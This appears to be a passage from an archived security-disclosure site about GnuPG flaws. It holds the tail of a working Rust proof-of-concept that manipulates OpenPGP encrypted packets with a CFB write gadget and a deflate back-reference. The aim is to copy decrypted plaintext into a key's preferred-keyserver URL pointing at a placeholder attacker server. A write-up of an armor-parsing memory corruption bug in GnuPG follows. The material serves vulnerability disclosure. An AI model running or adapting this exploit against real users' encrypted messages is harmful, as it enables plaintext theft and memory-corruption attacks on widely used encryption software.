<span class=3D"line"><span>    // ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?=
? ?? ?? # "IV"</span></span>
<span class=3D"line"><span>    // ?? ??                                    =
        # Protection bytes</span></span>
<span class=3D"line"><span>    //       a3 01                              =
        # comp pkt alg=3DDEFLATE</span></span>
<span class=3D"line"><span>    //             00 NN NN ~N  ~N              =
        # DF store len=3DNN</span></span>
<span class=3D"line"><span>    //                             d0 NN        =
        # comment pkt len=3DNN</span></span>
<span class=3D"line"><span>    //                                   00 00 0=
0 00 00 # garbage</span></span>
<span class=3D"line"><span>    // xx xx xx xx xx xx xx xx  xx xx xx xx xx x=
x xx xx # CFB write gadget</span></span>
<span class=3D"line"><span>    // 00 00 00 00 00 00 00 00  00 00 00 00 00 0=
0 00 00 # reset IV</span></span>
<span class=3D"line"><span>    // CT CT CT CT CT CT CT CT  CT CT CT CT CT C=
T CT CT # entire ciphertext</span></span>
<span class=3D"line"><span>    // [IOBUF EOF, pop decryption filter]</span>=
</span>
<span class=3D"line"><span>    // [DF store 0] [DF store 0] [DF store 0] [D=
F store 0] [...nop sled...]</span></span>
<span class=3D"line"><span>    // [DF store]</span></span>
<span class=3D"line"><span>    //     [PGP public key until unhashed subpac=
kets]</span></span>
<span class=3D"line"><span>    // [DF compressed]</span></span>
<span class=3D"line"><span>    //     [LengthDistance pointing to decrypted=
 data in compression buffer]</span></span>
<span class=3D"line"><span>    // [DF store]</span></span>
<span class=3D"line"><span>    //     [Rest of PGP public key]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let mut xb_change =3D vec![];</span></span>
<span class=3D"line"><span>    let mut xb_pt_crib =3D vec![];</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // ?? ?? ?? ?? ?? ?? ?? ??  ?? ?? ?? ?? ?? ?=
? ?? ?? # "IV"</span></span>
<span class=3D"line"><span>    xb_pt_crib.append(&#x26;mut vec![0; 16]);</s=
pan></span>
<span class=3D"line"><span>    xb_change.append(&#x26;mut vec![0; 16]);</sp=
an></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // ?? ??                                    =
        # Protection bytes</span></span>
<span class=3D"line"><span>    xb_pt_crib.append(&#x26;mut vec![0; 2]);</sp=
an></span>
<span class=3D"line"><span>    xb_change.append(&#x26;mut vec![0; 2]);</spa=
n></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    xb_pt_crib.append(&#x26;mut pt_comp_gpg_refe=
rence.to_vec());</span></span>
<span class=3D"line"><span>    //       a3 01                              =
        # comp pkt alg=3DDEFLATE</span></span>
<span class=3D"line"><span>    xb_change.push(pt_comp_gpg_reference[0]);</s=
pan></span>
<span class=3D"line"><span>    xb_change.push(CompressionAlgorithm::Zip.int=
o());</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // data packets start here</span></span>
<span class=3D"line"><span>    let until_eob =3D 16 - (xb_change.len() % 16=
);</span></span>
<span class=3D"line"><span>    let len_cur_pos =3D xb_change.len();</span><=
/span>
<span class=3D"line"><span>    let mut len =3D until_eob + 16 /*IV*/ + ct.l=
en() + 0 /*MDC*/ + 16 /*EOF trampoline*/;</span></span>
<span class=3D"line"><span>    let mut store_buf =3D vec![];</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    //                             d0 NN        =
        # comment pkt len=3DNN</span></span>
<span class=3D"line"><span>    CTBNew::new(Tag::Unknown(16)).serialize(&#x2=
6;mut store_buf).unwrap();</span></span>
<span class=3D"line"><span>    BodyLength::Full((len - 5 - 2 - 1 /*EOF*/) a=
s u32).serialize(&#x26;mut store_buf).unwrap();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    //             00 NN NN ~N  ~N              =
        # DF store len=3DNN</span></span>
<span class=3D"line"><span>    let mut deflate_state =3D EncoderState::new(=
vec![]);</span></span>
<span class=3D"line"><span>    deflate_state.set_huffman_to_fixed();</span>=
</span>
<span class=3D"line"><span>    store_buf.resize(len - 5 - 1 /*EOF*/, 0xa1);=
</span></span>
<span class=3D"line"><span>    write_uncomp(&#x26;mut deflate_state, &#x26;=
mut store_buf, false);</span></span>
<span class=3D"line"><span>    // deflate::stored_block::write_stored_heade=
r(&#x26;mut deflate_state.writer, false);</span></span>
<span class=3D"line"><span>    // deflate::stored_block::compress_block_sto=
red(&#x26;store_buf, &#x26;mut deflate_state.writer).unwrap();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    //-            00 NN NN ~N  ~N              =
        # DF store len=3DNN</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    //                                   00 00 0=
0 00 00 # garbage till EoB</span></span>
<span class=3D"line"><span>    xb_change.append(&#x26;mut deflate_state.inn=
er_vec()[0..until_eob].to_vec());</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // CFB write gadget</span></span>
<span class=3D"line"><span>    let mut ct_mal =3D xb_change.iter()</span></=
span>
<span class=3D"line"><span>        .zip(xb_pt_crib.iter())</span></span>
<span class=3D"line"><span>        .zip(ct.iter())</span></span>
<span class=3D"line"><span>        .map(|((a, b), c)| a ^ b ^ c)</span></sp=
an>
<span class=3D"line"><span>        .collect::&#x3C;Vec&#x3C;_>>();</span></=
span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    assert_eq!(ct_mal.len() % 16, 0);</span></sp=
an>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // 00 00 00 00 00 00 00 00  00 00 00 00 00 0=
0 00 00 # reset IV</span></span>
<span class=3D"line"><span>    ct_mal.append(&#x26;mut vec![0; 16]);</span>=
</span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    assert_eq!(ct_mal.len() % 16, 0);</span></sp=
an>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // CT CT CT CT CT CT CT CT  CT CT CT CT CT C=
T CT CT # entire ciphertext</span></span>
<span class=3D"line"><span>    ct_mal.append(&#x26;mut ct.clone());</span><=
/span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // 00 00 00 00 00 00 00 00  00 00 00 00 00 0=
0 00 00 # pad 22By for MDC</span></span>
<span class=3D"line"><span>    ct_mal.append(&#x26;mut vec![0xa2; 22]);</sp=
an></span>
<span class=3D"line"><span>    assert_eq!(len_cur_pos + len, ct_mal.len() +=
 16 /*trampoline*/ - 22 /*MDC*/);</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    ct_mal.chunks(16).for_each(|x| println!("&#1=
23;:02x?&#125;", x));</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    seip.set_body(Unprocessed(ct_mal));</span></=
span>
<span class=3D"line"><span>    out_pkgs.push(Packet::from(seip));</span></s=
pan>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let mut out_buf =3D vec![];</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    PacketPile::from(out_pkgs).serialize(&#x26;m=
ut out_buf).unwrap();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [IOBUF EOF trampoline, pop decryption fil=
ter]</span></span>
<span class=3D"line"><span>    out_buf.append(&#x26;mut vec![0xa3; 16 - 1 /=
*eof*/]);</span></span>
<span class=3D"line"><span>    let deflate_pos =3D deflate_state.inner_vec(=
).len();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [DF store 0] [DF store 0] [DF store 0] [D=
F store 0] [...nop sled...]</span></span>
<span class=3D"line"><span>    // for _ in 0..5 &#123;</span></span>
<span class=3D"line"><span>    //     // write_uncomp(&#x26;mut deflate_sta=
te, &#x26;mut vec![0xd0, 0], false);</span></span>
<span class=3D"line"><span>    // &#125;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [DF store [PGP public key until unhashed =
subpackets]]</span></span>
<span class=3D"line"><span>    // [DF compressed [LengthDistance pointing t=
o decrypted data in compression buffer]</span></span>
<span class=3D"line"><span>    // [DF store [Rest of PGP public key]]</span=
></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    len =3D ct.len();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let mut pub_buf =3D vec![];</span></span>
<span class=3D"line"><span>    let attacker_server =3D "http://localhost:99=
99/upload-key?x=3D";</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let (cert, _) =3D CertBuilder::general_purpo=
se(["Mallory"]).generate().unwrap();</span></span>
<span class=3D"line"><span>    cert.into_packets().map(|mut x| &#123;</span=
></span>
<span class=3D"line"><span>        if let Packet::Signature(Signature::V4(r=
ef mut s)) =3D x &#x26;&#x26; s.typ() =3D=3D SignatureType::DirectKey &#123=
;</span></span>
<span class=3D"line"><span>            let mut placeholder =3D attacker_ser=
ver.as_bytes().to_vec();</span></span>
<span class=3D"line"><span>            placeholder.append(&#x26;mut vec![0;=
 len]);</span></span>
<span class=3D"line"><span>            s.unhashed_area_mut().add(Subpacket:=
:new(SubpacketValue::PreferredKeyServer(placeholder), false).unwrap()).unwr=
ap();</span></span>
<span class=3D"line"><span>        &#125;</span></span>
<span class=3D"line"><span>        x</span></span>
<span class=3D"line"><span>    &#125;).collect::&#x3C;PacketPile>().seriali=
ze(&#x26;mut pub_buf).unwrap();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let pub_start =3D pub_buf.windows(attacker_s=
erver.len()).enumerate()</span></span>
<span class=3D"line"><span>        .find(|(p, s)| attacker_server.as_bytes(=
).eq(*s)).unwrap().0;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let at_len =3D pub_start + attacker_server.l=
en();</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [DF store [PGP public key until unhashed =
subpackets]]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    write_uncomp(&#x26;mut deflate_state, &#x26;=
mut pub_buf[0..(at_len)].to_vec(), false);</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    let cur_pos =3D deflate_state.inner_vec().le=
n() as u16;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [DF store [PGP public key until unhashed =
subpackets]]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    deflate_state.write_start_of_block(true, fal=
se);</span></span>
<span class=3D"line"><span>    deflate_state.write_lzvalue(LZType::StoredLe=
ngthDistance(</span></span>
<span class=3D"line"><span>        StoredLength::new(len as u8 - 3),</span>=
</span>
<span class=3D"line"><span>        (ct.len() + at_len + 15 /*eof trampoline=
*/) as u16</span></span>
<span class=3D"line"><span>    ));</span></span>
<span class=3D"line"><span>    deflate_state.write_end_of_block();</span></=
span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    // [DF store [Rest of PGP public key]]</span=
></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    write_uncomp(&#x26;mut deflate_state, &#x26;=
mut pub_buf[(pub_start + attacker_server.len() + len)..].to_vec(), false);<=
/span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    write_uncomp(&#x26;mut deflate_state, &#x26;=
mut vec![0xd0, 0], true);</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    out_buf.append(&#x26;mut deflate_state.inner=
_vec()[(deflate_pos)..].to_vec());</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    out_buf.chunks(16).for_each(|x| println!("&#=
123;:02x?&#125;", x));</span></span>
<span class=3D"line"><span>    std::fs::write("./result", out_buf).unwrap()=
;</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>    fn write_uncomp(es: &#x26;mut EncoderState, =
buf: &#x26;mut Vec&#x3C;u8>, fin: bool) &#123;</span></span>
<span class=3D"line"><span>        deflate::stored_block::write_stored_head=
er(&#x26;mut es.writer, fin);</span></span>
<span class=3D"line"><span>        deflate::stored_block::compress_block_st=
ored(buf, &#x26;mut es.writer).unwrap();</span></span>
<span class=3D"line"><span>    &#125;</span></span>
<span class=3D"line"><span>&#125;</span></span></code></pre><!----> <!---->=
<pre class=3D"shiki github-dark-default" style=3D"background-color:#0d1117;=
color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span>[package]</s=
pan></span>
<span class=3D"line"><span>name =3D "enc-poc"</span></span>
<span class=3D"line"><span>version =3D "0.1.0"</span></span>
<span class=3D"line"><span>edition =3D "2024"</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>[dependencies]</span></span>
<span class=3D"line"><span>sequoia-openpgp =3D "2.0.0"</span></span>
<span class=3D"line"><span>reqwest =3D &#123; version =3D "0.11", features =
=3D ["json", "blocking"] &#125;</span></span>
<span class=3D"line"><span>hex-literal =3D "1.0"</span></span>
<span class=3D"line"><span>deflate =3D &#123; git =3D "https://github.com/4=
9016/deflate-rs-internals" &#125;</span></span></code></pre><!----><!----><=
/article><!----><!----></main> <footer class=3D"bg-blue-500 p-4">contact: <=
a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemail=
=3D"dfbcb0b1abbebcab9fb8afb8f1b9beb6b3">[email&#160;protected]</a></footer>=
<!----><!--]--> <!--[!--><!--]--><!--]--><script data-cfasync=3D"false" src=
=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></scri=
pt></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="05-memcpy.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Memory Corruption in ASCII-Armor Parsing</h1> <!----><p>There exist memory=
 corruptions in the armor parsing code of <em>GnuPG</em> that can be exploi=
ted to provide primitives like out of bounds buffer read and write. This mi=
ght be exploitable to the point of remote code execution (RCE).</p> <h2>Imp=
act</h2> <p>While this may allow remote code execution (RCE), it definitive=
ly causes memory corruption.</p> <h2>Details</h2> <p>The root cause of this=
 vulnerability is straightforward and described in the first part of this s=
ection.
After that, we show how this bug is reachable. Finally we present the downs=
tream impacts leading to useful exploitation primitives.</p> <p>This bug op=
ens up a very large space of exploitation surface in a stateful way. We pre=
sent some, but by no means all, possible exploitation primitives. In the in=
terest of a timely disclosure and patch we do not present full exploit chai=
n demonstrating RCE.</p> <p>The function <code>armor_filter</code> (involve=
d in all ASCII-armor parsing), has a bug. The loop increments the variable =
<code>n</code> both in the loop head <code>[1]</code> and the loop body <co=
de>[2]</code>. While this leads to uninitialized memory and a buffer overwr=
ite by up to one, the more impactful problem is setting <code>*ret_len</cod=
e> to a value greater than the requested <code>size</code>. Note that the <=
code>ret_len</code> pointer here is used as an input and output parameter.<=
/p> <p>In summary, if <code>control =3D=3D IOBUFCTRL_UNDERFLOW &amp;&amp; a=
fx->inp_bypass</code> (<code>[3]</code>) is true, then <code>*ret_len</code=
> (at <code>[4]</code>) is greater than the requested size (<code>[5]</code=
>).</p> <!----><pre class=3D"shiki github-dark-default" style=3D"background=
-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><sp=
an style=3D"color:#8B949E">/****************</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * This filter is used t=
o handle the armor stuff</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">armor_filter</span><span=
 style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">void</span><=
span style=3D"color:#FF7B72"> *</span><span style=3D"color:#FFA657">opaque<=
/span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF7B72">=
int</span><span style=3D"color:#FFA657"> control</span><span style=3D"color=
:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">             IOBUF </spa=
n><span style=3D"color:#FFA657">a</span><span style=3D"color:#E6EDF3">, byt=
e </span><span style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA657=
">buf</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#FF=
7B72">size_t</span><span style=3D"color:#FF7B72"> *</span><span style=3D"co=
lor:#FFA657">ret_len</span><span style=3D"color:#E6EDF3">) &#123;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">    size_t</span><span s=
tyle=3D"color:#E6EDF3"> size </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#FF7B72"> *</span><span style=3D"color:#E6EDF3">ret_l=
en;</span><span style=3D"color:#8B949E"> // &#x3C;-- [5]</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">// ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (control </span><span style=3D"color:#FF7B72">=3D=3D</s=
pan><span style=3D"color:#E6EDF3"> IOBUFCTRL_UNDERFLOW </span><span style=
=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#E6EDF3"> afx->i=
np_bypass) &#123;</span><span style=3D"color:#8B949E">  // &#x3C;-- [3]</sp=
an></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        n </span><span s=
tyle=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</span><sp=
an style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (afx->buffer_len) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">            /* Copy the =
data from AFX->BUFFER to BUF.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            for</span><s=
pan style=3D"color:#E6EDF3"> (; n </span><span style=3D"color:#FF7B72">&#x3=
C;</span><span style=3D"color:#E6EDF3"> size </span><span style=3D"color:#F=
F7B72">&#x26;&#x26;</span><span style=3D"color:#E6EDF3"> afx->buffer_pos </=
span><span style=3D"color:#FF7B72">&#x3C;</span><span style=3D"color:#E6EDF=
3"> afx->buffer_len; n</span><span style=3D"color:#FF7B72">++</span><span s=
tyle=3D"color:#E6EDF3">)</span><span style=3D"color:#8B949E"> // &#x3C;-- [=
1]</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">                buf</spa=
n><span style=3D"color:#E6EDF3">[n</span><span style=3D"color:#FF7B72">++</=
span><span style=3D"color:#E6EDF3">] </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#E6EDF3"> afx->buffer[afx->buffer_pos</span>=
<span style=3D"color:#FF7B72">++</span><span style=3D"color:#E6EDF3">];</sp=
an><span style=3D"color:#8B949E"> // &#x3C;-- [2]</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            if</span><sp=
an style=3D"color:#E6EDF3"> (afx->buffer_pos </span><span style=3D"color:#F=
F7B72">>=3D</span><span style=3D"color:#E6EDF3"> afx->buffer_len)</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">                afx->buf=
fer_len </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color=
:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#8B949E">        /* If there is s=
till space in BUF, read directly into it.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        for</span><span =
style=3D"color:#E6EDF3"> (; n </span><span style=3D"color:#FF7B72">&#x3C;</=
span><span style=3D"color:#E6EDF3"> size; n</span><span style=3D"color:#FF7=
B72">++</span><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">            if</span><sp=
an style=3D"color:#E6EDF3"> ((c </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#D2A8FF"> iobuf_get</span><span style=3D"color:#E6=
EDF3">(a)) </span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D=
"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span><span style=
=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                break</s=
pan><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">            buf</span><s=
pan style=3D"color:#E6EDF3">[n] </span><span style=3D"color:#FF7B72">=3D</s=
pan><span style=3D"color:#E6EDF3"> c </span><span style=3D"color:#FF7B72">&=
#x26;</span><span style=3D"color:#FF7B72"> 0x</span><span style=3D"color:#7=
9C0FF">ff</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span=
 style=3D"color:#E6EDF3">n)</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">            /* We didn't=
 get any data.  EOF.  */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            rc </span><s=
pan style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FF7B72"> -</spa=
n><span style=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">;</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        *</span><span st=
yle=3D"color:#E6EDF3">ret_len </span><span style=3D"color:#FF7B72">=3D</spa=
n><span style=3D"color:#E6EDF3"> n;</span><span style=3D"color:#8B949E"> //=
 &#x3C;-- [4]</span></span></code></pre><!----> <p>Invoking the function wi=
th <code>*ret_len =3D 1023</code> (input) and <code>afx->buffer_len > 511</=
code> causes the loop to increment beyond the limit. This is a pseudo code =
trace of the triggered behavior.</p> <!----><pre class=3D"shiki github-dark=
-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><=
code><span class=3D"line"><span>(n =3D 0) &#x3C; (size =3D 1023) &#x26;&#x2=
6; (afx->buffer_pos =3D 0) &#x3C; (afx->buffer_len =3D 512)</span></span>
<span class=3D"line"><span>  buf[(n++ =3D 1, return 0)] =3D afx->buffer[(af=
x->buffer_pos++ =3D 1, return 0)];</span></span>
<span class=3D"line"><span>(n++ =3D 2)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>(n =3D 2) &#x3C; (size =3D 1023) &#x26;&#x26; (a=
fx->buffer_pos =3D 1) &#x3C; (afx->buffer_len =3D 512)</span></span>
<span class=3D"line"><span>  buf[(n++ =3D 3, return 2)] =3D afx->buffer[(af=
x->buffer_pos++ =3D 2, return 1)];</span></span>
<span class=3D"line"><span>(n++ =3D 4)</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>[...]</span></span>
<span class=3D"line"><span></span></span>
<span class=3D"line"><span>(n =3D 1022) &#x3C; (size =3D 1023) &#x26;&#x26;=
 (afx->buffer_pos =3D 511) &#x3C; (afx->buffer_len =3D 512)</span></span>
<span class=3D"line"><span>  buf[(n++ =3D 1023, return 1022)] =3D afx->buff=
er[(afx->buffer_pos++ =3D 512, return 511)];</span></span>
<span class=3D"line"><span>(n++ =3D 1024)</span></span></code></pre><!---->=
 <p>For typical inputs, the <code>inp_bypass</code> flag is zero, rendering=
 this branch effectively dead code. However, a specially crafted malformed =
packet can trigger this condition in <em>GnuPG</em>.</p> <p>For context, <c=
ode>afx->inp_bypass</code> is a flag that is set if the input is determined=
 to be a binary payload instead of armored data. The armor filter is only p=
ushed to the filter stack if the input is determined to be actually armored=
 though. For readers unfamiliar with the input processing in <em>GnuPG</em>=
 using filters we refer to this code <a href=3D"https://github.com/gpg/gnup=
g/blob/master/common/iobuf.h#L34-L90" rel=3D"nofollow">comment</a> and rela=
ted code. The common pattern for using the armor filter is the following:</=
p> <!----><pre class=3D"shiki github-dark-default" style=3D"background-colo=
r:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span st=
yle=3D"color:#FF7B72">if</span><span style=3D"color:#E6EDF3"> (</span><span=
 style=3D"color:#FF7B72">!</span><span style=3D"color:#E6EDF3">opt.no_armor=
) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">use_armor_filter<=
/span><span style=3D"color:#E6EDF3">(fp)) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        afx </span><span=
 style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> new_armor=
_context</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        push_armor_filte=
r</span><span style=3D"color:#E6EDF3">(afx, fp);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p><code>use_armor_filter</code> does some rudimentary che=
cks to see if pushing an armor filter is necessary:</p> <!----><pre class=
=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6e=
df3" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#8B949E=
">/****************</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Try to check whether =
the iobuf is armored</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> * Returns true if this =
may be the case; the caller should use the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> *	   filter to do furth=
er processing.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"> */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">use_armor_filter</span><=
span style=3D"color:#E6EDF3">(IOBUF </span><span style=3D"color:#FFA657">a<=
/span><span style=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    byte </span><span st=
yle=3D"color:#FFA657">buf</span><span style=3D"color:#E6EDF3">[</span><span=
 style=3D"color:#79C0FF">2</span><span style=3D"color:#E6EDF3">];</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">    int</span><span styl=
e=3D"color:#E6EDF3"> n;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* fixme: there migh=
t be a problem with iobuf_peek */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    n </span><span style=
=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> iobuf_peek</spa=
n><span style=3D"color:#E6EDF3">(a, buf, </span><span style=3D"color:#79C0F=
F">2</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (n </span><span style=3D"color:#FF7B72">=3D=3D</span><s=
pan style=3D"color:#FF7B72"> -</span><span style=3D"color:#79C0FF">1</span>=
<span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><=
span style=3D"color:#8B949E"> /* EOF, doesn't matter whether armored or not=
 */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">n)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF3">;</span><=
span style=3D"color:#8B949E"> /* can't check it: try armored */</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (n </span><span style=3D"color:#FF7B72">!=3D</span><spa=
n style=3D"color:#79C0FF"> 2</span><span style=3D"color:#E6EDF3">)</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6EDF3">;</span><=
span style=3D"color:#8B949E"> /* short buffer */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    return</span><span s=
tyle=3D"color:#D2A8FF"> is_armored</span><span style=3D"color:#E6EDF3">(buf=
);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>From this we conclude that we need to provide an input =
satisfying <code>is_armored</code> on push. As such, we start our payload w=
ith standard armored (base64 encoded) data.</p> <p>Our goal is to eventuall=
y get <code>afx->inp_bypass</code> to <code>1</code>, but the setter has th=
e following condition:</p> <!----><pre class=3D"shiki github-dark-default" =
style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span=
 class=3D"line"><span style=3D"color:#8B949E">/* figure out whether the dat=
a is armored or not */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#FF7B72"> int</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">check_input</span><span =
style=3D"color:#E6EDF3">( </span><span style=3D"color:#79C0FF">armor_filter=
_context_t</span><span style=3D"color:#FF7B72"> *</span><span style=3D"colo=
